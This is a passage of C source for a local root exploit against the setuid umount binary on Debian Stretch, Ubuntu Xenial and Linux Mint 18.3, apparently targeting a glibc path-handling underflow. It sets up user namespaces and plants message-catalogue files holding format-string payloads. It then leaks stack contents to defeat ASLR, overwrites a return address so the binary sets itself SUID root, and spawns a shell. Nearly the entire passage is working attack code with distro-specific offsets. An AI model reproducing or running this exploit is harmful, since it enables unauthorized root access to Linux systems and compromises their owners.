charset=UTF-8\\n\"\n    \"Content-Transfer-Encoding: 8bit\\n\";\n\n/** The pid of a namespace process with the working directory\n *  at a writable /tmp only visible by the process. */\npid_t namespacedProcessPid=-1;\n\nint killNamespacedProcessFlag=1;\n\n/** The pathname to the umount binary to execute. */\nchar *umountPathname;\n\n/** The pathname to the named pipe, that will synchronize umount\n *  binary with supervisory process before triggering the second\n *  and last exploitation phase.\n */\nchar *secondPhaseTriggerPipePathname;\n\n/** The pathname to the second phase exploitation catalogue file.\n *  This is needed as the catalogue cannot be sent via the trigger\n *  pipe from above.\n */\nchar *secondPhaseCataloguePathname;\n\n/** The OS-release detected via /etc/os-release. */\nchar *osRelease=NULL;\n\n/** This table contains all relevant information to adapt the\n *  attack to supported Linux distros (fully updated) to support\n *  also older versions, hash of umount/libc/libmount should be\n *  used also for lookups.\n *  The 4th string is an array of 4-byte integers with the offset\n *  values for format string generation. Values specify:\n *  * Stack position (in 8 byte words) for **argv\n *  * Stack position of argv[0]\n *  * Offset from __libc_start_main return position from main()\n *    and system() function, first instruction after last sigprocmask()\n *    before execve call.\n */\n#define ED_STACK_OFFSET_CTX 0\n#define ED_STACK_OFFSET_ARGV 1\n#define ED_STACK_OFFSET_ARG0 2\n#define ED_LIBC_GETDATE_DELTA 3\n#define ED_LIBC_EXECL_DELTA 4\nstatic char* osSpecificExploitDataList[]={\n// Debian Stretch\n    \"\\\"9 (stretch)\\\"\",\n    \"../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A\",\n    \"from_archive\",\n// Delta for Debian Stretch \"2.24-11+deb9u1\"\n    \"\\x06\\0\\0\\0\\x24\\0\\0\\0\\x3e\\0\\0\\0\\x7f\\xb9\\x08\\x00\\x4f\\x86\\x09\\x00\",\n// Ubuntu Xenial libc=2.23-0ubuntu9\n    \"\\\"16.04.3 LTS (Xenial Xerus)\\\"\",\n    \"../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A\",\n    \"_nl_load_locale_from_archive\",\n    \"\\x07\\0\\0\\0\\x26\\0\\0\\0\\x40\\0\\0\\0\\xd0\\xf5\\x09\\x00\\xf0\\xc1\\x0a\\x00\",\n// Linux Mint 18.3 Sylvia - same parameters as \"Ubuntu Xenial\"\n    \"\\\"18.3 (Sylvia)\\\"\",\n    \"../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A\",\n    \"_nl_load_locale_from_archive\",\n    \"\\x07\\0\\0\\0\\x26\\0\\0\\0\\x40\\0\\0\\0\\xd0\\xf5\\x09\\x00\\xf0\\xc1\\x0a\\x00\",\n    NULL};\n\nchar **osReleaseExploitData=NULL;\n\n/** Locate the umount binary within the given search path list,\n *  elements separated by colons.\n *  @return a pointer to a malloced memory region containing the\n *  string or NULL if not found.\n */\nchar* findUmountBinaryPathname(char *searchPath) {\n  char *testPathName=(char*)malloc(PATH_MAX);\n  assert(testPathName);\n\n  while(*searchPath) {\n    char *endPtr=strchr(searchPath, ':');\n    int length=endPtr-searchPath;\n    if(!endPtr) {\n      length=strlen(searchPath);\n      endPtr=searchPath+length-1;\n    }\n    int result=snprintf(testPathName, PATH_MAX, \"%.*s/%s\", length,\n        searchPath, \"umount\");\n    if(result>=PATH_MAX) {\n      fprintf(stderr, \"Binary search path element too long, ignoring it.\\n\");\n    } else {\n      struct stat statBuf;\n      result=stat(testPathName, &statBuf);\n// Just assume, that umount is owner-executable. There might be\n// alternative ACLs, which grant umount execution only to selected\n// groups, but it would be unusual to have different variants\n// of umount located searchpath on the same host.\n      if((!result)&&(S_ISREG(statBuf.st_mode))&&(statBuf.st_mode&S_IXUSR)) {\n        return(testPathName);\n      }\n    }\n    searchPath=endPtr+1;\n  }\n\n  free(testPathName);\n  return(NULL);\n}\n\n\n/** Get the value for a given field name.\n *  @return NULL if not found, a malloced string otherwise.\n */\nchar* getReleaseFileField(char *releaseData, int dataLength, char *fieldName) {\n  int nameLength=strlen(fieldName);\n  while(dataLength>0) {\n    char *nextPos=memchr(releaseData, '\\n', dataLength);\n    int lineLength=dataLength;\n    if(nextPos) {\n      lineLength=nextPos-releaseData;\n      nextPos++;\n    } else {\n      nextPos=releaseData+dataLength;\n    }\n    if((!strncmp(releaseData, fieldName, nameLength))&&\n        (releaseData[nameLength]=='=')) {\n      return(strndup(releaseData+nameLength+1, lineLength-nameLength-1));\n    }\n    releaseData=nextPos;\n    dataLength-=lineLength;\n  }\n  return(NULL);\n}\n\n\n/** Detect the release by reading the VERSION field from /etc/os-release.\n *  @return 0 on success.\n */\nint detectOsRelease() {\n  int handle=open(\"/etc/os-release\", O_RDONLY);\n  if(handle<0)\n    return(-1);\n\n  char *buffer=alloca(1024);\n  int infoLength=read(handle, buffer, 1024);\n  close(handle);\n  if(infoLength<0)\n    return(-1);\n  osRelease=getReleaseFileField(buffer, infoLength, \"VERSION\");\n  if(!osRelease)\n    osRelease=getReleaseFileField(buffer, infoLength, \"NAME\");\n  if(osRelease) {\n    fprintf(stderr, \"Detected OS version: %s\\n\", osRelease);\n    return(0);\n  }\n\n  return(-1);\n}\n\n\n/** Create the catalogue data in memory.\n *  @return a pointer to newly allocated catalogue data memory\n */\nchar* createMessageCatalogueData(char **origStringList, char **transStringList,\n    int stringCount, int *catalogueDataLength) {\n  int contentLength=strlen(messageCataloguePreamble)+2;\n  for(int stringPos=0; stringPos<stringCount; stringPos++) {\n    contentLength+=strlen(origStringList[stringPos])+\n        strlen(transStringList[stringPos])+2;\n  }\n  int preambleLength=(0x1c+0x14*(stringCount+1)+0xc)&-0xf;\n  char *catalogueData=(char*)malloc(preambleLength+contentLength);\n  memset(catalogueData, 0, preambleLength);\n  int *preambleData=(int*)catalogueData;\n  *preambleData++=0x950412de;\n  preambleData++;\n  *preambleData++=stringCount+1;\n  *preambleData++=0x1c;\n  *preambleData++=(*(preambleData-2))+(stringCount+1)*sizeof(int)*2;\n  *preambleData++=0x5;\n  *preambleData++=(*(preambleData-3))+(stringCount+1)*sizeof(int)*2;\n\n  char *nextCatalogueStringStart=catalogueData+preambleLength;\n  for(int stringPos=-1; stringPos<stringCount; stringPos++) {\n    char *writeString=(stringPos<0)?\"\":origStringList[stringPos];\n    int length=strlen(writeString);\n    *preambleData++=length;\n    *preambleData++=(nextCatalogueStringStart-catalogueData);\n    memcpy(nextCatalogueStringStart, writeString, length+1);\n    nextCatalogueStringStart+=length+1;\n  }\n  for(int stringPos=-1; stringPos<stringCount; stringPos++) {\n    char *writeString=(stringPos<0)?messageCataloguePreamble:transStringList[stringPos];\n    int length=strlen(writeString);\n    *preambleData++=length;\n    *preambleData++=(nextCatalogueStringStart-catalogueData);\n    memcpy(nextCatalogueStringStart, writeString, length+1);\n    nextCatalogueStringStart+=length+1;\n  }\n  assert(nextCatalogueStringStart-catalogueData==preambleLength+contentLength);\n  for(int stringPos=0; stringPos<=stringCount+1; stringPos++) {\n//    *preambleData++=(stringPos+1);\n    *preambleData++=(int[]){1, 3, 2, 0, 4}[stringPos];\n  }\n  *catalogueDataLength=preambleLength+contentLength;\n  return(catalogueData);\n}\n\n\n/** Create the catalogue data from the string lists and write\n *  it to the given file.\n *  @return 0 on success.\n */\nint writeMessageCatalogue(char *pathName, char **origStringList,\n    char **transStringList, int stringCount) {\n  int catalogueFd=open(pathName, O_WRONLY|O_CREAT|O_TRUNC|O_NOCTTY, 0644);\n  if(catalogueFd<0) {\n    fprintf(stderr, \"Failed to open catalogue file %s for writing.\\n\",\n        pathName);\n    return(-1);\n  }\n  int catalogueDataLength;\n  char *catalogueData=createMessageCatalogueData(\n      origStringList, transStringList, stringCount, &catalogueDataLength);\n  int result=write(catalogueFd, catalogueData, catalogueDataLength);\n  assert(result==catalogueDataLength);\n  close(catalogueFd);\n  free(catalogueData);\n  return(0);\n}\n\nvoid createDirectoryRecursive(char *namespaceMountBaseDir, char *pathName) {\n  char pathBuffer[PATH_MAX];\n  int pathNameLength=0;\n  while(1) {\n    char *nextPathSep=strchr(pathName+pathNameLength, '/');\n    if(nextPathSep) {\n      pathNameLength=nextPathSep-pathName;\n    } else {\n      pathNameLength=strlen(pathName);\n    }\n    int result=snprintf(pathBuffer, sizeof(pathBuffer), \"%s/%.*s\",\n        namespaceMountBaseDir, pathNameLength, pathName);\n    assert(result<PATH_MAX);\n    result=mkdir(pathBuffer, 0755);\n    assert((!result)||(errno==EEXIST));\n    if(!pathName[pathNameLength])\n      break;\n    pathNameLength++;\n  }\n}\n\n\n/** This child function prepares the namespaced mount point and\n *  then waits to be killed later on.\n */\nstatic int usernsChildFunction() {\n  while(geteuid()!=0) {\n    sched_yield();\n  }\n  int result=mount(\"tmpfs\", \"/tmp\", \"tmpfs\", MS_MGC_VAL, NULL);\n  assert(!result);\n  assert(!chdir(\"/tmp\"));\n  int handle=open(\"ready\", O_WRONLY|O_CREAT|O_EXCL|O_NOFOLLOW|O_NOCTTY, 0644);\n  assert(handle>=0);\n  close(handle);\n  sleep(100000);\n}\n\n/** Prepare a process living in an own mount namespace and setup\n *  the mount structure appropriately. The process is created\n *  in a way allowing cleanup at program end by just killing it,\n *  thus removing the namespace.\n *  @return the pid of that process or -1 on error.\n */\npid_t prepareNamespacedProcess() {\n  if(namespacedProcessPid==-1) {\n    fprintf(stderr, \"No pid supplied via command line, trying to create a namespace\\nCAVEAT: /proc/sys/kernel/unprivileged_userns_clone must be 1 on systems with USERNS protection.\\n\");\n\n    char *stackData=(char*)malloc(1<<20);\n    assert(stackData);\n    namespacedProcessPid=clone(usernsChildFunction, stackData+(1<<20),\n        CLONE_NEWUSER|CLONE_NEWNS|SIGCHLD, NULL);\n    if(namespacedProcessPid==-1) {\n      fprintf(stderr, \"USERNS clone failed: %d (%s)\\n\", errno, strerror(errno));\n      return(-1);\n    }\n\n    char idMapFileName[128];\n    char idMapData[128];\n    sprintf(idMapFileName, \"/proc/%d/setgroups\", namespacedProcessPid);\n    int setGroupsFd=open(idMapFileName, O_WRONLY);\n    assert(setGroupsFd>=0);\n    int result=write(setGroupsFd, \"deny\", 4);\n    assert(result>0);\n    close(setGroupsFd);\n\n    sprintf(idMapFileName, \"/proc/%d/uid_map\", namespacedProcessPid);\n    int uidMapFd=open(idMapFileName, O_WRONLY);\n    assert(uidMapFd>=0);\n    sprintf(idMapData, \"0 %d 1\\n\", getuid());\n    result=write(uidMapFd, idMapData, strlen(idMapData));\n    assert(result>0);\n    close(uidMapFd);\n\n    sprintf(idMapFileName, \"/proc/%d/gid_map\", namespacedProcessPid);\n    int gidMapFd=open(idMapFileName, O_WRONLY);\n    assert(gidMapFd>=0);\n    sprintf(idMapData, \"0 %d 1\\n\", getgid());\n    result=write(gidMapFd, idMapData, strlen(idMapData));\n    assert(result>0);\n    close(gidMapFd);\n\n// After setting the maps for the child process, the child may\n// start setting up the mount point. Wait for that to complete.\n    sleep(1);\n    fprintf(stderr, \"Namespaced filesystem created with pid %d\\n\",\n        namespacedProcessPid);\n  }\n\n  osReleaseExploitData=osSpecificExploitDataList;\n  if(osRelease) {\n// If an OS was detected, try to find it in list. Otherwise use\n// default.\n    for(int tPos=0; osSpecificExploitDataList[tPos]; tPos+=4) {\n      if(!strcmp(osSpecificExploitDataList[tPos], osRelease)) {\n        osReleaseExploitData=osSpecificExploitDataList+tPos;\n        break;\n      }\n    }\n  }\n\n  char pathBuffer[PATH_MAX];\n  int result=snprintf(pathBuffer, sizeof(pathBuffer), \"/proc/%d/cwd\",\n     namespacedProcessPid);\n  assert(result<PATH_MAX);\n  char *namespaceMountBaseDir=strdup(pathBuffer);\n  assert(namespaceMountBaseDir);\n\n// Create directories needed for umount to proceed to final state\n// \"not mounted\".\n  createDirectoryRecursive(namespaceMountBaseDir, \"(unreachable)/x\");\n  result=snprintf(pathBuffer, sizeof(pathBuffer),\n      \"(unreachable)/tmp/%s/C.UTF-8/LC_MESSAGES\", osReleaseExploitData[2]);\n  assert(result<PATH_MAX);\n  createDirectoryRecursive(namespaceMountBaseDir, pathBuffer);\n  result=snprintf(pathBuffer, sizeof(pathBuffer),\n      \"(unreachable)/tmp/%s/X.X/LC_MESSAGES\", osReleaseExploitData[2]);\n  createDirectoryRecursive(namespaceMountBaseDir, pathBuffer);\n  result=snprintf(pathBuffer, sizeof(pathBuffer),\n      \"(unreachable)/tmp/%s/X.x/LC_MESSAGES\", osReleaseExploitData[2]);\n  createDirectoryRecursive(namespaceMountBaseDir, pathBuffer);\n\n// Create symlink to trigger underflows.\n  result=snprintf(pathBuffer, sizeof(pathBuffer), \"%s/(unreachable)/tmp/down\",\n      namespaceMountBaseDir);\n  assert(result<PATH_MAX);\n  result=symlink(osReleaseExploitData[1], pathBuffer);\n  assert(!result||(errno==EEXIST));\n\n// getdate will leave that string in rdi to become the filename\n// to execute for the next round.\n  char *selfPathName=realpath(\"/proc/self/exe\", NULL);\n  result=snprintf(pathBuffer, sizeof(pathBuffer), \"%s/DATEMSK\",\n      namespaceMountBaseDir);\n  assert(result<PATH_MAX);\n  int handle=open(pathBuffer, O_WRONLY|O_CREAT|O_TRUNC, 0755);\n  assert(handle>0);\n  result=snprintf(pathBuffer, sizeof(pathBuffer), \"#!%s\\nunused\",\n      selfPathName);\n  assert(result<PATH_MAX);\n  result=write(handle, pathBuffer, result);\n  close(handle);\n  free(selfPathName);\n\n// Write the initial message catalogue to trigger stack dumping\n// and to make the \"umount\" call privileged by toggling the \"restricted\"\n// flag in the context.\n  result=snprintf(pathBuffer, sizeof(pathBuffer),\n      \"%s/(unreachable)/tmp/%s/C.UTF-8/LC_MESSAGES/util-linux.mo\",\n      namespaceMountBaseDir, osReleaseExploitData[2]);\n  assert(result<PATH_MAX);\n\n  char *stackDumpStr=(char*)malloc(0x80+6*(STACK_LONG_DUMP_BYTES/8));\n  assert(stackDumpStr);\n  char *stackDumpStrEnd=stackDumpStr;\n  stackDumpStrEnd+=sprintf(stackDumpStrEnd, \"AA%%%d$lnAAAAAA\",\n      ((int*)osReleaseExploitData[3])[ED_STACK_OFFSET_CTX]);\n  for(int dumpCount=(STACK_LONG_DUMP_BYTES/8); dumpCount; dumpCount--) {\n    memcpy(stackDumpStrEnd, \"%016lx\", 6);\n    stackDumpStrEnd+=6;\n  }\n// We wrote allready 8 bytes, write so many more to produce a\n// count of 'L' and write that to the stack. As all writes so\n// sum up to a count aligned by 8, and 'L'==0x4c, we will have\n// to write at least 4 bytes, which is longer than any \"%hhx\"\n// format string output. Hence do not care about the byte content\n// here. The target write address has a 16 byte alignment due\n// to varg structure.\n  stackDumpStrEnd+=sprintf(stackDumpStrEnd, \"%%1$%dhhx%%%d$hhn\",\n      ('L'-8-STACK_LONG_DUMP_BYTES*2)&0xff,\n      STACK_LONG_DUMP_BYTES/16);\n  *stackDumpStrEnd=0;\n  result=writeMessageCatalogue(pathBuffer,\n      (char*[]){\n          \"%s: mountpoint not found\",\n          \"%s: not mounted\",\n          \"%s: target is busy\\n        (In some cases useful info about processes that\\n         use the device is found by lsof(8) or fuser(1).)\"\n      },\n      (char*[]){\"1234\", stackDumpStr, \"5678\"},\n      3);\n  assert(!result);\n  free(stackDumpStr);\n\n  result=snprintf(pathBuffer, sizeof(pathBuffer),\n      \"%s/(unreachable)/tmp/%s/X.X/LC_MESSAGES/util-linux.mo\",\n      namespaceMountBaseDir, osReleaseExploitData[2]);\n  assert(result<PATH_MAX);\n  result=mknod(pathBuffer, S_IFIFO|0666, S_IFIFO);\n  assert((!result)||(errno==EEXIST));\n  secondPhaseTriggerPipePathname=strdup(pathBuffer);\n\n  result=snprintf(pathBuffer, sizeof(pathBuffer),\n      \"%s/(unreachable)/tmp/%s/X.x/LC_MESSAGES/util-linux.mo\",\n      namespaceMountBaseDir, osReleaseExploitData[2]);\n  secondPhaseCataloguePathname=strdup(pathBuffer);\n\n  free(namespaceMountBaseDir);\n  return(namespacedProcessPid);\n}\n\n\n\n/** Create the format string to write an arbitrary value to the\n *  stack. The created format string avoids to interfere with\n *  the complex fprintf format handling logic by accessing fprintf\n *  internal state on stack. Thus the modification method does\n *  not depend on that ftp internals. The current libc fprintf\n *  implementation copies values for formatting before applying\n *  the %n writes, therefore pointers changed by fprintf operation\n *  can only be utilized with the next fprintf invocation. As\n *  we cannot rely on a stack having a suitable number of pointers\n *  ready for arbitrary writes, we need to create those pointers\n *  one by one. Everything needed is pointer on stack pointing\n *  to another valid pointer and 4 helper pointers pointing to\n *  writeable memory. The **argv list matches all those requirements.\n *  @param printfArgvValuePos the position of the argv pointer from\n *  printf format string view.\n *  @param argvStackAddress the address of the argv list, where\n *  the argv[0] pointer can be read.\n *  @param printfArg0ValuePos the position of argv list containing\n *  argv[0..n] pointers.\n *  @param mainFunctionReturnAddress the address on stack where\n *  the return address from the main() function to _libc_start()\n *  is stored.\n *  @param writeValue the value to write to mainFunctionReturnAddress\n */\nvoid createStackWriteFormatString(\n    char *formatBuffer, int bufferSize, int printfArgvValuePos,\n    void *argvStackAddress, int printfArg0ValuePos,\n    void *mainFunctionReturnAddress, unsigned short *writeData,\n    int writeDataLength) {\n  int result=0;\n  int currentValue=-1;\n  for(int nextWriteValue=0; nextWriteValue<0x10000;) {\n// Find the lowest value to write.\n    nextWriteValue=0x10000;\n    for(int valuePos=0; valuePos<writeDataLength; valuePos++) {\n       int value=writeData[valuePos];\n       if((value>currentValue)&&(value<nextWriteValue))\n         nextWriteValue=value;\n    }\n    if(currentValue<0)\n      currentValue=0;\n    if(currentValue!=nextWriteValue) {\n      result=snprintf(formatBuffer, bufferSize, \"%%1$%1$d.%1$ds\",\n          nextWriteValue-currentValue);\n      formatBuffer+=result;\n      bufferSize-=result;\n      currentValue=nextWriteValue;\n    }\n    for(int valuePos=0; valuePos<writeDataLength; valuePos++) {\n       if(writeData[valuePos]==nextWriteValue) {\n          result=snprintf(formatBuffer, bufferSize,\n              \"%%%d$hn\", printfArg0ValuePos+valuePos+1);\n          formatBuffer+=result;\n          bufferSize-=result;\n       }\n    }\n  }\n\n// Print the return function address location number of bytes\n// except 8 (those from the LABEL counter) and write the value\n// to arg1.\n  int writeCount=((int)mainFunctionReturnAddress-18)&0xffff;\n  result=snprintf(formatBuffer, bufferSize,\n      \"%%1$%d.%ds%%1$s%%1$s%%%d$hn\",\n      writeCount, writeCount, printfArg0ValuePos);\n  formatBuffer+=result;\n  bufferSize-=result;\n\n// Write the LABEL 6 more times, thus multiplying the single\n// byte write pointer to an 8-byte aligned argv-list pointer and\n// update argv[0] to point to argv[1..n].\n  writeCount=(((int)argvStackAddress)-(writeCount+56))&0xffff;\n  result=snprintf(formatBuffer, bufferSize,\n      \"%%1$s%%1$s%%1$s%%1$s%%1$s%%1$s%%1$%d.%ds%%%d$hn\",\n      writeCount, writeCount, printfArgvValuePos);\n  formatBuffer+=result;\n  bufferSize-=result;\n\n// Append a debugging preamble.\n  result=snprintf(formatBuffer, bufferSize, \"-%%35$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%78$s\\n\",\n      printfArgvValuePos, printfArg0ValuePos-1, printfArg0ValuePos,\n      printfArg0ValuePos+1, printfArg0ValuePos+2, printfArg0ValuePos+3,\n      printfArg0ValuePos+4, printfArg0ValuePos+5, printfArg0ValuePos+6);\n  formatBuffer+=result;\n  bufferSize-=result;\n}\n\n\n/** Wait for the trigger pipe to open. The pipe will be closed\n *  immediately after opening it.\n *  @return 0 when the pipe was opened before hitting a timeout.\n */\nint waitForTriggerPipeOpen(char *pipeName) {\n  struct timespec startTime, currentTime;\n  int result=clock_gettime(CLOCK_MONOTONIC, &startTime);\n  startTime.tv_sec+=10;\n  assert(!result);\n  while(1) {\n    int pipeFd=open(pipeName, O_WRONLY|O_NONBLOCK);\n    if(pipeFd>=0) {\n      close(pipeFd);\n      break;\n    }\n    result=clock_gettime(CLOCK_MONOTONIC, &currentTime);\n    if(currentTime.tv_sec>startTime.tv_sec) {\n      return(-1);\n    }\n    currentTime.tv_sec=0;\n    currentTime.tv_nsec=100000000;\n    nanosleep(&currentTime, NULL);\n  }\n  return(0);\n}\n\n\n/** Invoke umount to gain root privileges.\n *  @return 0 if the umount process terminated with expected exit\n *  status.\n */\nint attemptEscalation() {\n  int escalationSuccess=-1;\n\n  char targetCwd[64];\n  snprintf(\n      targetCwd, sizeof(targetCwd)-1, \"/proc/%d/cwd\", namespacedProcessPid);\n\n  int pipeFds[2];\n  int result=pipe(pipeFds);\n  assert(!result);\n\n  pid_t childPid=fork();\n  assert(childPid>=0);\n  if(!childPid) {\n// This is the child process.\n    close(pipeFds[0]);\n    fprintf(stderr, \"Starting subprocess\\n\");\n    dup2(pipeFds[1], 1);\n    dup2(pipeFds[1], 2);\n    close(pipeFds[1]);\n    result=chdir(targetCwd);\n    assert(!result);\n\n// Create so many environment variables for a kind of \"stack spraying\".\n    int envCount=UMOUNT_ENV_VAR_COUNT;\n    char **umountEnv=(char**)malloc((envCount+1)*sizeof(char*));\n    assert(umountEnv);\n    umountEnv[envCount--]=NULL;\n    umountEnv[envCount--]=\"LC_ALL=C.UTF-8\";\n    while(envCount>=0) {\n      umountEnv[envCount--]=\"AANGUAGE=X.X\";\n    }\n// Use the built-in C locale.\n// Invoke umount first by overwriting heap downwards using links\n// for \"down\", then retriggering another error message (\"busy\")\n// with hopefully similar same stack layout for other path \"/\".\n    char* umountArgs[]={umountPathname, \"/\", \"/\", \"/\", \"/\", \"/\", \"/\", \"/\", \"/\", \"/\", \"/\", \"down\", \"LABEL=78\", \"LABEL=789\", \"LABEL=789a\", \"LABEL=789ab\", \"LABEL=789abc\", \"LABEL=789abcd\", \"LABEL=789abcde\", \"LABEL=789abcdef\", \"LABEL=789abcdef0\", \"LABEL=789abcdef0\", NULL};\n    result=execve(umountArgs[0], umountArgs, umountEnv);\n    assert(!result);\n  }\n  close(pipeFds[1]);\n  int childStdout=pipeFds[0];\n\n  int escalationPhase=0;\n  char readBuffer[1024];\n  int readDataLength=0;\n  char stackData[STACK_LONG_DUMP_BYTES];\n  int stackDataBytes=0;\n\n  struct pollfd pollFdList[1];\n  pollFdList[0].fd=childStdout;\n  pollFdList[0].events=POLLIN;\n\n// Now learn about the binary, prepare data for second exploitation\n// phase. The phases should be:\n// * 0: umount executes, glibc underflows and causes an util-linux.mo\n//   file to be read, that contains a poisonous format string.\n//   Successful poisoning results in writing of 8*'A' preamble,\n//   we are looking for to indicate end of this phase.\n// * 1: The poisoned process writes out stack content to defeat\n//   ASLR. Reading all relevant stack end this phase.\n// * 2: The poisoned process changes the \"LANGUAGE\" parameter,\n//   thus triggering re-read of util-linux.mo. To avoid races,\n//   we let umount open a named pipe, thus blocking execution.\n//   As soon as the pipe is ready for writing, we write a modified\n//   version of util-linux.mo to another file because the pipe\n//   cannot be used for sending the content.\n// * 3: We read umount output to avoid blocking the process and\n//   wait for it to ROP execute fchown/fchmod and exit.\n  while(1) {\n    if(escalationPhase==2) {\n// We cannot use the standard poll from below to monitor the pipe,\n// but also we do not want to block forever. Wait for the pipe\n// in nonblocking mode and then continue with next phase.\n      result=waitForTriggerPipeOpen(secondPhaseTriggerPipePathname);\n      if(result) {\n        goto attemptEscalationCleanup;\n      }\n      escalationPhase++;\n    }\n\n// Wait at most 10 seconds for IO.\n    result=poll(pollFdList, 1, 10000);\n    if(!result) {\n// We ran into a timeout. This might be the result of a deadlocked\n// child, so kill the child and retry.\n      fprintf(stderr, \"Poll timed out\\n\");\n      goto attemptEscalationCleanup;\n    }\n// Perform the IO operations without blocking.\n    if(pollFdList[0].revents&(POLLIN|POLLHUP)) {\n      result=read(\n          pollFdList[0].fd, readBuffer+readDataLength,\n          sizeof(readBuffer)-readDataLength);\n      if(!result) {\n        if(escalationPhase<3) {\n// Child has closed the socket unexpectedly.\n          goto attemptEscalationCleanup;\n        }\n        break;\n      }\n      if(result<0) {\n        fprintf(stderr, \"IO error talking to child\\n\");\n        goto attemptEscalationCleanup;\n      }\n      readDataLength+=result;\n\n// Handle the data depending on escalation phase.\n      int moveLength=0;\n      switch(escalationPhase) {\n        case 0: // Initial sync: read A*8 preamble.\n          if(readDataLength<8)\n            continue;\n          char *preambleStart=memmem(readBuffer, readDataLength,\n              \"AAAAAAAA\", 8);\n          if(!preambleStart) {\n// No preamble, move content only if buffer is full.\n            if(readDataLength==sizeof(readBuffer))\n              moveLength=readDataLength-7;\n            break;\n          }\n// We found, what we are looking for. Start reading the stack.\n          escalationPhase++;\n          moveLength=preambleStart-readBuffer+8;\n        case 1: // Read the stack.\n// Consume stack data until or local array is full.\n          while(moveLength+16<=readDataLength) {\n            result=sscanf(readBuffer+moveLength, \"%016lx\",\n                (int*)(stackData+stackDataBytes));\n            if(result!=1) {\n// Scanning failed, the data injection procedure apparently did\n// not work, so this escalation failed.\n              goto attemptEscalationCleanup;\n            }\n            moveLength+=sizeof(long)*2;\n            stackDataBytes+=sizeof(long);\n// See if we reached end of stack dump already.\n            if(stackDataBytes==sizeof(stackData))\n              break;\n          }\n          if(stackDataBytes!=sizeof(stackData))\n            break;\n\n// All data read, use it to prepare the content for the next phase.\n          fprintf(stderr, \"Stack content received, calculating next phase\\n\");\n\n          int *exploitOffsets=(int*)osReleaseExploitData[3];\n\n// This is the address, where source Pointer is pointing to.\n          void *sourcePointerTarget=((void**)stackData)[exploitOffsets[ED_STACK_OFFSET_ARGV]];\n// This is the stack address source for the target pointer.\n          void *sourcePointerLocation=sourcePointerTarget-0xd0;\n\n          void *targetPointerTarget=((void**)stackData)[exploitOffsets[ED_STACK_OFFSET_ARG0]];\n// This is the stack address of the libc start function return\n// pointer.\n          void *libcStartFunctionReturnAddressSource=sourcePointerLocation-0x10;\n          fprintf(stderr, \"Found source address location %p pointing to target address %p with value %p, libc offset is %p\\n\",\n              sourcePointerLocation, sourcePointerTarget,\n              targetPointerTarget, libcStartFunctionReturnAddressSource);\n// So the libcStartFunctionReturnAddressSource is the lowest address\n// to manipulate, targetPointerTarget+...\n\n          void *libcStartFunctionAddress=((void**)stackData)[exploitOffsets[ED_STACK_OFFSET_ARGV]-2];\n          void *stackWriteData[]={\n              libcStartFunctionAddress+exploitOffsets[ED_LIBC_GETDATE_DELTA],\n              libcStartFunctionAddress+exploitOffsets[ED_LIBC_EXECL_DELTA]\n          };\n          fprintf(stderr, \"Changing return address from %p to %p, %p\\n\",\n              libcStartFunctionAddress, stackWriteData[0],\n              stackWriteData[1]);\n          escalationPhase++;\n\n          char *escalationString=(char*)malloc(1024);\n          createStackWriteFormatString(\n              escalationString, 1024,\n              exploitOffsets[ED_STACK_OFFSET_ARGV]+1, // Stack position of argv pointer argument for fprintf\n              sourcePointerTarget, // Base value to write\n              exploitOffsets[ED_STACK_OFFSET_ARG0]+1, // Stack position of argv[0] pointer ...\n              libcStartFunctionReturnAddressSource,\n              (unsigned short*)stackWriteData,\n              sizeof(stackWriteData)/sizeof(unsigned short)\n          );\n          fprintf(stderr, \"Using escalation string %s\", escalationString);\n\n          result=writeMessageCatalogue(\n              secondPhaseCataloguePathname,\n              (char*[]){\n                  \"%s: mountpoint not found\",\n                  \"%s: not mounted\",\n                  \"%s: target is busy\\n        (In some cases useful info about processes that\\n         use the device is found by lsof(8) or fuser(1).)\"\n              },\n              (char*[]){\n                  escalationString,\n                  \"BBBB5678%3$s\\n\",\n                  \"BBBBABCD%s\\n\"},\n              3);\n          assert(!result);\n          break;\n        case 2:\n        case 3:\n// Wait for pipe connection and output any result from mount.\n          readDataLength=0;\n          break;\n        default:\n          fprintf(stderr, \"Logic error, state %d\\n\", escalationPhase);\n          goto attemptEscalationCleanup;\n      }\n      if(moveLength) {\n        memmove(readBuffer, readBuffer+moveLength, readDataLength-moveLength);\n        readDataLength-=moveLength;\n      }\n    }\n  }\n\nattemptEscalationCleanup:\n// Wait some time to avoid killing umount even when exploit was\n// successful.\n  sleep(1);\n  close(childStdout);\n// It is safe to kill the child as we did not wait for it to finish\n// yet, so at least the zombie process is still here.\n  kill(childPid, SIGKILL);\n  pid_t waitedPid=waitpid(childPid, NULL, 0);\n  assert(waitedPid==childPid);\n\n  return(escalationSuccess);\n}\n\n\n/** This function invokes the shell specified via environment\n *  or the default shell \"/bin/sh\" when undefined. The function\n *  does not return on success.\n *  @return -1 on error\n */\nint invokeShell(char *shellName) {\n  if(!shellName)\n    shellName=getenv(\"SHELL\");\n  if(!shellName)\n    shellName=\"/bin/sh\";\n  char* shellArgs[]={shellName, NULL};\n  execve(shellName, shellArgs, environ);\n  fprintf(stderr, \"Failed to launch shell %s\\n\", shellName);\n  return(-1);\n}\n\nint main(int argc, char **argv) {\n  char *programmName=argv[0];\n  int exitStatus=1;\n\n  if(getuid()==0) {\n    fprintf(stderr, \"%s: you are already root, invoking shell ...\\n\",\n        programmName);\n    invokeShell(NULL);\n    return(1);\n  }\n\n  if(geteuid()==0) {\n    struct stat statBuf;\n    int result=stat(\"/proc/self/exe\", &statBuf);\n    assert(!result);\n    if(statBuf.st_uid||statBuf.st_gid) {\n      fprintf(stderr, \"%s: internal invocation, setting SUID mode\\n\",\n          programmName);\n      int handle=open(\"/proc/self/exe\", O_RDONLY);\n      fchown(handle, 0, 0);\n      fchmod(handle, 04755);\n      exit(0);\n    }\n\n    fprintf(stderr, \"%s: invoked as SUID, invoking shell ...\\n\",\n        programmName);\n    